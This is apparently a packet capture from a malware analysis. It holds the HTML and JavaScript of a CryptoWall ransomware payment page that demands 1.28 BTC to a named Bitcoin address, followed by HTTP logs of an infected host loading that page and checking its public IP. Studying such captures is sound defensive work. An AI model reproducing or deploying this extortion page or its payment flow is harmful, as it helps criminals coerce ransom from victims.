+	    <div id="decrypt" class="s13" style="text-align:center;">
+	    <center>
+<script type="text/javascript">
+
+var payment_type = {'moneypak':1, 'paysafecard':2, 'bitcoin':3, 'litecoin':4, 'ukash':5}
+
+    function check_pay_info(draft_type)
+      {
+      var payment_form = dge('payment_form');
+      if (!payment_form)
+	{
+	write_msg('Error on payment');
+	return false;
+	}
+
+      var draft_number_elm = dge('code_'+draft_type);
+      var draft_currency_elm = dge('currency_'+draft_type);
+
+      if (!draft_number_elm)
+	{
+	write_msg('Error: code input or currency input not found');
+	return false;
+	}
+
+      var draft_number = draft_number_elm.value;
+
+      if (draft_number.length < 10)
+	{
+	write_msg('You have entered an invalid check number or transaction ID');
+	return false;
+	}
+
+      var draft_currency = 0;
+
+      if (draft_currency_elm)
+	{
+        draft_currency = draft_currency_elm.value;
+
+        if (draft_currency.length < 1)
+	  {
+	  write_msg('Error: draft currency is invalid');
+	  return false;
+	  }
+	}
+
+      if (payment_type)
+	{
+	var d_type = payment_type[draft_type];
+	payment_form.do_pay.value = '1';
+	payment_form.draft_number.value = draft_number;
+	payment_form.draft_type.value = d_type;
+	payment_form.draft_currency.value = draft_currency;
+	payment_form.submit();
+	}
+      return true;
+      }
+
+function openEx(url)
+  {
+  w = window.open();
+  w.document.write('<meta http-equiv="refresh" content="0;url='+url+'">');
+  w.document.close();
+  return false;
+  }
+
+</script>
+<center><div style="font-size:13px; line-height:20px; margin-bottom:10px;">We are present a special software - CryptoWall Decrypter - which is allow to decrypt and return control to all your encrypted files.<br><b>How to buy CryptoWall decrypter?</b></div></center>
+<div style="width:700px; margin-top:5px; margin-bottom:20px; text-align:left; border-style:solid; border-width:15px; border-color:#EEEEEE; padding:10px;">
+				  <form id="payment_form" action="" method="POST">
+				    <input type="hidden" name="do_pay" value="0">
+				    <input type="hidden" name="draft_number" value="">
+				    <input type="hidden" name="draft_type" value="">
+				    <input type="hidden" name="draft_currency" value="">
+				    <input type="hidden" name="draft_simple_amount" value="">
+				  </form>
+				  <div id="bitcoin_info" class="s13" style="margin-top:10px;">
+				    <center><img src="img/bitcoin.png" border="0"></center><br>
+				    <div class="man_step"><font color=red>1.</font> You should register Bitcon wallet (<a href="#" onclick="return openEx('http://www.wikihow.com/Create-an-Online-Bitcoin-Wallet');">click here for more information with pictures</a>)</div>
+				    <br>
+				    <div class="man_step"><font color=red>2.</font> Purchasing Bitcoins - Although it's not yet easy to buy bitcoins, it's getting simpler every day.</div>
+				    <div style="margin-left:20px; margin-top:5px;">
+				     <b><i>Here are our recommendations:</i></b>
+				      <ul style="margin-top:4px;">
+				      
+					<li><a href="#" onclick="return openEx('https://localbitcoins.com/buy-bitcoins-online/usd/western-union/');">LocalBitcoins.com (WU)</a> - Buy Bitcoins with Western Union</li>
+					<li><b><a href="#" onclick="return openEx('https://coincafe.com');">Coincafe.com</a> - Recommended for fast, simple service. Payment Methods: Western Union, Bank of America,Cash by FedEx, Moneygram, Money Order. In NYC: Bitcoin ATM, In Person</b></li>
+					<li><a href="#" onclick="return openEx('https://localbitcoins.com/');">LocalBitcoins.com</a> - Service allows you to search for people in your community willing to sell bitcoins to you directly.</li>
+					<li><a href="#" onclick="return openEx('https://coinrnr.com/');">coinrnr.com</a> - Another fast way to buy bitcoins</li>
+					<li><a href="#" onclick="return openEx('http://bitquick.co/');">bitquick.co</a> - Buy Bitcoins Instantly for Cash</li>
+					<li><a href="#" onclick="return openEx('http://howtobuybitcoins.info/');">How To Buy Bitcoins</a> - An international directory of bitcoin exchanges.</li>
+					<li><a href="#" onclick="return openEx('https://cashintocoins.com/');">Cash Into Coins</a> - Bticoin for cash.</li>
+					<li><a href="#" onclick="return openEx('https://www.coinjar.com/buy_bitcoins');">CoinJar</a> - CoinJar allows direct bitcoin purchases on their site.</li>
+					<li><a href="#" onclick="return openEx('https://anxpro.com/');">anxpro.com</a></li>
+					<li><a href="#" onclick="return openEx('https://bittylicious.com/');">bittylicious.com</a></li>
+					<li><a href="#" onclick="return openEx('http://zipzapinc.com/');">ZipZap</a> - ZipZap is a global cash payment network enabling consumers to pay for digital currency.</li>
+
+									      </ul>
+				    </div>
+				    <br>
+				  				    <div class="man_step">
+				      <font color=red>3.</font> Send <b><input type="text" class="amount" value="1.28" name="amount_bitcoin" readonly> BTC</b> to Bitcoin address: 
+				      <input type="text" class="coin_address" value="17yiXcFgbxoev8rnjhJzfrVeYMF5cnro7C" name="bitcoin_address" readonly>
+				    </div>
+				    <br>
+				    <div class="man_step" style="margin-bottom:5px;">
+					<font color=red>4.</font> Enter the Transaction ID and select amount:				    </div>
+				    <input type="text" id="code_bitcoin" class="inputcode" maxlength="70" style="width:420px; height:22px;"> <select id="currency_bitcoin" class="inputcurrency"><option value="500">1.28 BTC ~= 500 USD</option></select> <input type="button" class="clear_button" value="Clear" onclick="input_reset('code_bitcoin');"><br>
+				    &nbsp;<font style="font-size:12px;"><b>Note:</b> Transaction ID - you can find in detailed info about transaction you made.<br>&nbsp;&nbsp;(example 44214efca56ef039386ddb929c40bf34f19a27c42f07f5cf3e2aa08114c4d1f2)</font><br><br>
+				    <div class="man_step">
+					<font color=red>5.</font> Please check the payment information and click "PAY".				    </div><br><br>
+				    <div style="text-align:center;">
+				      <input type="button" class="button_pay" value="PAY" onclick="check_pay_info('bitcoin');" onmouseover="this.className='button_pay_sel'" onmouseout="this.className='button_pay'">
+				    </div>
+				  </div>
+				</div>
+
+</div>
+</center><center><div  class="drafts" style="padding-top:3px; padding-bottom:3px; background:#4C4441; color:#EFEFEF; font-size:14px; font-weight:bold;">Your sent drafts</div></center><center><div id="drafts_info" style="position:relative;"><table border=0 class="drafts" style="font-size:12px;" cellspacing=0 cellpadding=0><tr style="background:#4C4441; color:#EFEFEF"><td class="tdpad" style="width:45px;">Num</td><td class="tdpad" style="width:130px;">Draft type</td><td class="tdpad">Draft number or transaction ID</td><td class="tdpad" style="width:70px;">Amount</td><td class="tdpad" style="width:130px;">Status</td><tr><td class="tdpad" style="width:40px;"></td><td class="tdpad"></td><td class="tdpad"><input type="text" style="color:red; border-style:solid; border-width:0px; text-align:center; width:99%;" value="Your payments not found." readonly></td><td class="tdpad"></td><td class="tdpad"></td></table></div></center><br><center><div style="width:700px; padding:3px; border-style:solid; border-width:4px; border-color:#E5E5E5;"><b>0</b> valid drafts are put, the total amount of <b>0</b> USD/EUR. <font color="#770000">The residue is <b>500</b> USD/EUR.</font></div></center><br><br>	    </div>
+	  </td>
+	  <td class="bwhite"></td>
+	</tr>
+	<tr><td class="angle blbpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brbpng"></td>
+	</tr>
+      </table>
+    </div>
+  </body>
+</html>
+
+
+
+[172.16.165.164:49317] -- -- --> [194.58.103.250:80] 
+GET /picture.php?k=1j7xbus&8724a3c6340a2712d7ebf0aa0d802782 HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:38 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 1899
+X-Powered-By: PHP/5.4.34-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+
+
+[172.16.165.164:49315] -- -- --> [194.58.103.250:80] 
+GET /img/flags/es.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:39:37 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 634
+Last-Modified: Thu, 25 Oct 2007 20:01:10 GMT
+ETag: "c80963-27a-43d56b2050d80;502d05ea6dc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49314] -- -- --> [194.58.103.250:80] 
+GET /img/flags/us.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:19 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 825
+Last-Modified: Thu, 25 Oct 2007 20:01:10 GMT
+ETag: "c80a01-339-43d56b2050d80;502d05ea6dc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49314] -- -- --> [194.58.103.250:80] 
+GET /img/button_pay.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:21 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 727
+Last-Modified: Thu, 19 Dec 2013 05:25:56 GMT
+ETag: "c808cc-2d7-4eddc655ca100"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49314] -- -- --> [194.58.103.250:80] 
+GET /favicon.ico HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:23 GMT
+Content-Type: image/vnd.microsoft.icon
+Connection: keep-alive
+Content-Length: 318
+Last-Modified: Tue, 06 May 2014 17:10:40 GMT
+ETag: "c808c4-13e-4f8be53c90400"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49315] -- -- --> [194.58.103.250:80] 
+GET /img/lt.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:21 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 240
+Last-Modified: Thu, 12 Dec 2013 03:32:50 GMT
+ETag: "c808d5-f0-4ed4dfffedc80"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49313] -- -- --> [194.58.103.250:80] 
+GET /img/lb.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:21 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 239
+Last-Modified: Thu, 12 Dec 2013 05:22:48 GMT
+ETag: "c808d1-ef-4ed4f89445a00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49317] -- -- --> [194.58.103.250:80] 
+GET /img/rt.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:20 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 242
+Last-Modified: Thu, 12 Dec 2013 05:21:36 GMT
+ETag: "c808fd-f2-4ed4f84f9b800"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49316] -- -- --> [194.58.103.250:80] 
+GET /img/rb.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:20 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 237
+Last-Modified: Thu, 12 Dec 2013 05:21:52 GMT
+ETag: "c808fc-ed-4ed4f85eddc00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49311] -- -- --> [194.58.103.250:80] 
+GET /img/bitcoin.png HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://paytordmbdekmizq.torpacho.com/1j7xbUs
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: paytordmbdekmizq.torpacho.com
+Connection: Keep-Alive
+Cookie: PHPSESSID=7scc2405m0c9cmo1eavq3qanj5
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.0.15
+Date: Fri, 14 Nov 2014 22:40:19 GMT
+Content-Type: image/png
+Connection: keep-alive
+Content-Length: 5523
+Last-Modified: Tue, 17 Dec 2013 03:05:00 GMT
+ETag: "c808c8-1593-4edb231a98f00"
+Accept-Ranges: bytes
+
+
+[172.16.165.164:49257] -- -- --> [54.200.182.206:80] 
+GET /text HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
+Host: wtfismyip.com
+Cache-Control: no-cache
+
+
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Length: 15
+Date: Fri, 14 Nov 2014 22:36:40 GMT
+Connection: keep-alive
+
+74.115.214.195
+
+
+
